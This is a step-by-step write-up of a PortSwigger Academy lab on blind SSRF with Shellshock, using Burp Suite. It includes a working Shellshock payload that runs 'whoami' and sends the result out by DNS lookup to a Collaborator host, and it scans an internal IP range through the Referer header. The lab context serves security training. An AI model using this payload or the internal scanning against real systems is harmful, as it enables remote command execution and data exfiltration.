# Lab: Blind SSRF with Shellshock exploitation

 This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 

**Note**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.*

# Step 1 enable "Collaborator Everywhere" extension

![image](https://user-images.githubusercontent.com/83407557/210154720-6eb9da98-cb89-4c5a-bc3f-21d5e16fbdf0.png)

# Step 2 add target domain to scope:

![image](https://user-images.githubusercontent.com/83407557/210154759-5af7a07a-bb26-42c5-9daf-6e81bc21cdce.png)

![image](https://user-images.githubusercontent.com/83407557/210154768-55611307-caf4-4c6c-a822-3f7b048a65ba.png)

# Step 3 Walk the product page

I see that Collaborator got a hit when browsing the product page:

![image](https://user-images.githubusercontent.com/83407557/210154825-2f310b59-2da2-461b-beae-103c4f7b6d3d.png)

I send the product page request to intruder:

# Step 4 Create a collaborator payload 

Getting the collabe url:

![image](https://user-images.githubusercontent.com/83407557/210154921-4fcf2a35-7309-4f7a-ab7b-ad05b5fe5cb6.png)

URL: l6s56xjkdv3bn7216hsihqpds4yvmlaa.oastify.com

Shellshock payload:

```bash
() { :; }; /usr/bin/nslookup $(whoami).l6s56xjkdv3bn7216hsihqpds4yvmlaa.oastify.com
```

# Step 5 Add payload to inturder's User-Agent string:

![image](https://user-images.githubusercontent.com/83407557/210154977-0cb69e69-6e9e-4bac-925f-ccb7292c4dbe.png)

# Step 6 change Referer Header to target an internal subnet

![image](https://user-images.githubusercontent.com/83407557/210154994-420b1a1c-dc7e-4ff7-939c-6f20e6fae4e9.png)

add a payload position for the last octet of internal ip address:

![image](https://user-images.githubusercontent.com/83407557/210155010-4d38f437-2bd6-43ac-a4d7-e5204013a712.png)

make the paload numbers 1-255 then launch the attack

![image](https://user-images.githubusercontent.com/83407557/210155018-da309d4a-deb7-4579-a3f6-131f18ef6dcb.png)

# Step 7 poll collaborator:

When I poll my collaborator I see that DNS lookups were made containing the username:

![image](https://user-images.githubusercontent.com/83407557/210155049-e51a4801-4a42-4db7-bbbd-76fff97ab4e0.png)

# Step 8 enter username:

![image](https://user-images.githubusercontent.com/83407557/210155060-286b9265-2c5d-46de-9554-5890e9a8241f.png)

Which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210155064-8fdb9973-9504-44d8-9d67-a5dd666b3864.png)

